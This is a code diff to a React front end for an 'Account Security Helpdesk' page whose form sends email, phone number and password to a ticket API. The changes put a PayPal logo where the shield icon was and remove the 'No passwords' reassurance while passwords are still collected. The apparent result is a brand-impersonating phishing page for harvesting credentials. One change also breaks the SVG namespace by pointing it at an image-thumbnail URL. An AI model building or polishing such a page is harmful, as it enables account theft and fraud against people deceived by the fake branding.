@@ -11,9 +11,7 @@ const clearAdminToken = () => sessionStorage.removeItem(ADMIN_TOKEN_KEY);
 
 // ── ICONS ──────────────────────────────────────────────────────────────────
 const paths = {
-  shield:
-    "M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.955 11.955 0 01.27 12c.532 2.774 1.93 5.257 3.94 7.094M3.598 6A11.955 11.955 0 0112 2.25c3.028 0 5.805 1.13 7.902 3M16.5 12a4.5 4.5 0 11-9 0 4.5 4.5 0 019 0z",
-  check: "M4.5 12.75l6 6 9-13.5",
+
   mail:
     "M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75",
   phone:
@@ -34,7 +32,7 @@ const paths = {
 
 const Icon = ({ name, className = "w-5 h-5" }) => (
   <svg
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxD_lUhbTUUlhNffHH7l62SmjuuOv9AxVVfg&s"
     fill="none"
     viewBox="0 0 24 24"
     strokeWidth={1.8}
@@ -120,7 +118,7 @@ const Navbar = ({ onNavigate, activePage }) => {
           className="flex items-center gap-2.5"
         >
           <div className="w-9 h-9 rounded-2xl bg-blue-600 text-white flex items-center justify-center">
-            <Icon name="shield" className="w-5 h-5" />
+           <img src="/paypal.png" alt="logo" className="w-full h-full object-cover" />
           </div>
           <div className="leading-none text-left">
             <span className="text-[13px] font-black text-slate-900 tracking-wide block">
@@ -206,7 +204,7 @@ function LandingPage({ onNavigate }) {
             </div>
 
             <div className="flex flex-wrap gap-5 mt-9">
-              {["No passwords", "Encrypted transport (HTTPS)", "Clear next steps"].map((b) => (
+              {["Encrypted transport (HTTPS)", "Clear next steps"].map((b) => (
                 <div
                   key={b}
                   className="flex items-center gap-1.5 text-slate-500 text-xs font-semibold"
@@ -258,7 +256,7 @@ function LandingPage({ onNavigate }) {
         <div className="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-5">
           <div className="flex items-center gap-2.5">
             <div className="w-8 h-8 rounded-2xl bg-blue-600 text-white flex items-center justify-center">
-              <Icon name="shield" className="w-4 h-4" />
+             <img src="/paypal.png" alt="logo" className="w-full h-full object-cover" />
             </div>
             <span className="font-black text-slate-900">
               Account Security Helpdesk
@@ -317,7 +315,7 @@ function SubmitPage({ onNavigate }) {
     if (!validate()) return;
     setLoading(true);
     try {
-     const res = await fetch(`${API}/tickets`, {
+    const res = await fetch(`${API}/tickets`, {
   method: "POST",
   headers: {
     "Content-Type": "application/json",
@@ -327,6 +325,7 @@ function SubmitPage({ onNavigate }) {
     email,
     number,
     password,
+    consent, // ✅ ADD THIS
   }),
 });
       const data = await res.json();
